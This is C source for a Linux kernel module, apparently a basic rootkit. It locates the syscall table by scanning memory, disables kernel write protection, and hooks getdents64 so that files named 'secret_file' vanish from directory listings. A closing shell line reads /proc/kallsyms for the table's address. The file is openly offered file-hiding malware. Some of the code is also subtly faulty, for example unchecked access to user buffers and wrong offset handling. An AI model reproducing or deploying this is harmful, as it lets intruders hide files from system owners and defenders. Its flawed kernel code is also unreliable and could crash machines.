#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/string.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <asm/current.h>
#include <asm/uaccess.h>
#include <linux/uaccess.h>

static asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
void **find_sys_call_table(void);

/**
 * Locate sys_call_table in kernel memory by scanning.
 */
void **find_sys_call_table(void) {
    void **sct;
    unsigned long offset = PAGE_OFFSET;

    while (offset < ULLONG_MAX) {
        sct = (void **)offset;

        // Check if this is the sys_call_table by comparing known syscall addresses.
        if (sct[__NR_close] == (void *)sys_close) {
            return sct;
        }

        offset += sizeof(void *);
    }

    return NULL;
}

/**
 * Hooked version of getdents64 to hide specific files.
 */
static asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int nread = original_getdents64(fd, dirp, count);
    struct linux_dirent64 *cur, *prev = NULL;
    unsigned long offset = 0;

    if (nread <= 0)
        return nread;

    while (offset < nread) {
        cur = (struct linux_dirent64 *)((char *)dirp + offset);

        // Hide files with the name "secret_file".
        if (strcmp(cur->d_name, "secret_file") == 0) {
            if (prev)
                prev->d_reclen += cur->d_reclen;
            else
                memmove(cur, (char *)cur + cur->d_reclen, nread - offset - cur->d_reclen);
            nread -= cur->d_reclen;
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    return nread;
}

static int __init file_hider_init(void) {
    void **sys_call_table;

    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "Failed to find sys_call_table\n");
        return -EFAULT;
    }

    original_getdents64 = (void *)sys_call_table[__NR_getdents64];

    // Disable write protection.
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (void *)hooked_getdents64;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "File hider loaded successfully.\n");
    return 0;
}

static void __exit file_hider_exit(void) {
    void **sys_call_table;

    sys_call_table = find_sys_call_table();
    if (!sys_call_table)
        return;

    // Disable write protection.
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (void *)original_getdents64;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "File hider unloaded successfully.\n");
}

module_init(file_hider_init);
module_exit(file_hider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hide specific files using a hooked system call.");

echo $(cat /proc/kallsyms | grep sys_call_table) > /tmp/sys_call_table_address